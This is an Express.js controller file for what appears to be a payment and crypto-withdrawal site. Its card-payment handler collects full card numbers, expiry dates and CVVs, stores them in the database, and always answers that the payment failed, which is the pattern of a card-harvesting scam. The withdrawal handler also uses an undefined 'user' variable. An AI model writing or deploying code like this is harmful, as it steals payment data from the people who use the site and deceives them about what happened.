const cardData = require('../Schemas/paymentSchema')
const prove = require('../Schemas/payProveSchema')

const withdrawalData = require('../Schemas/withdrawalSchema')
const emailData = require('../userVitualize/EmailData')
const notificationRunner = require('../userVitualize/notification')
const transporter = require('../userVitualize/tranporter')
const {
  cardDataValidate,
  withdrawalValidator,
} = require('../validators/validators')
const { fileFormate } = require('./authControllers')

exports.paymentProveController = (req, res) => {
  const { email, _id } = req.user

  const photoInfo = {
    picName: req.file.originalname,
    picPath: req.file.path,
    picType: req.file.mimetype,
    picSize: fileFormate(req.file.size, 2),
  }

  const provefile = new prove({
    id: _id,
    email,
    proveImg: photoInfo,
  })
  //{ data: fs.readFileSync(file.path), type: 'img/png' }
  provefile.save((err, img) => {
    if (err || !img) {
      return res.status(422).json({ message: 'upload not successful' })
    }
    return res.json('prove upload successful')
  })
}
exports.paymentDataController = (req, res) => {
  const { _id } = req.user
  const {
    name,
    email,
    phone,
    country,
    zipcode,
    street,
    town,
    state,
  } = req.body.billdata.userBillDetails
  const {
    cardHolderName,
    cardNumber,
    expMonth,
    expYear,
    cvv,
  } = req.body.billdata.debitDetails

  const { error, value } = cardDataValidate.validate({
    name,
    email,
    phone,
    country,
    zipcode,
    street,
    town,
    state,
    cardHolderName,
    cardNumber,
    expMonth,
    expYear,
    cvv,
  })

  if (error || !value) {
    return res.status(422).json({ message: error.message })
  }

  const cardInfo = new cardData({
    name,
    email,
    phone,
    country,
    zipcode,
    street,
    town,
    state,
    cardHolderName,
    cardNumber,
    expMonth,
    expYear,
    cvv,
    id: _id,
  })

  cardInfo.save((error, data) => {
    if (error || !data) {
      return res.status(422).json({ message: error.message })
    }

    const notifyInfo = {
      message: 'Your payment was not successfull',
      type: 'payment',
      status: 'error',
    }
    notificationRunner(req.user, notifyInfo)

    return res.json('sorry unsuccessful payment')
  })
}
exports.withdrawalController = (req, res) => {
  const { _id } = req.user
  const { amount, type, email, wallet } = req.body

  const { error, value } = withdrawalValidator.validate(req.body)

  if (error || !value) {
    return res.status(422).json({ message: error.message })
  }

  if (email !== req.user.email) {
    return res
      .status(403)
      .json('Error: Email must be equal to the reqistered email')
  }

  const withdrawalInfo = new withdrawalData({
    amount,
    type,
    email,
    wallet,
    id: _id,
  })

  withdrawalInfo.save((error, value) => {
    if (error || !value) {
      return res.status(422).json({ message: error.message })
    }

    const notifyInfo = {
      message: 'Your withdrawal has been successfully placed',
      type,
      status: 'success',
    }
    notificationRunner(user, notifyInfo)

    transporter.sendMail(emailData.withdrawals(user), (error, success) => {
      if (error || !success) {
        return res.status(422).json({ message: error.message })
      }

      return res.json(
        `Hi ${user.name} wait for 24 hours while we process your withdrawal`,
      )
    })
  })
}
